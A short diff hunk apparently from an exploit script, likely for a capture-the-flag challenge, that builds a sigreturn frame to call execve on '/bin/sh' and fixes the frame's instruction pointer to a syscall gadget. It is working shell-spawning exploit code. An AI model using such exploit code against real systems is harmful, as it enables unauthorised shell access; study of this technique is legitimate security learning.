@@ -45,7 +45,7 @@ frame.rdi = binsh
 frame.rsi = 0
 frame.rdx = 0
 frame.rsp = 0
-frame.rip = syscall-3
+frame.rip = syscall
 
 pop_rbp = 0x4011cd
 
